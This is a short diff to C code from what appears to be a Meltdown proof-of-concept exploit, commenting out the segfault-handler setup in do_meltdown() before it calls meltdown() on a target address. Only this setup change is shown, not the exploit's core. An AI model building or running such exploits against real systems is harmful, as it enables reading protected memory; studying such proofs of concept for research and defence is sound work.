@@ -132,10 +132,10 @@ static void meltdown(uintptr_t adrs) {
 */
 static int do_meltdown(uintptr_t adrs) {
     // Init segfault handler
-    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
-        printf("Failed to setup signal handler\n");
-        return -1;
-    }
+    // if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
+        // printf("Failed to setup signal handler\n");
+        // return -1;
+    // }
     
     // call meltdown
     meltdown(adrs);
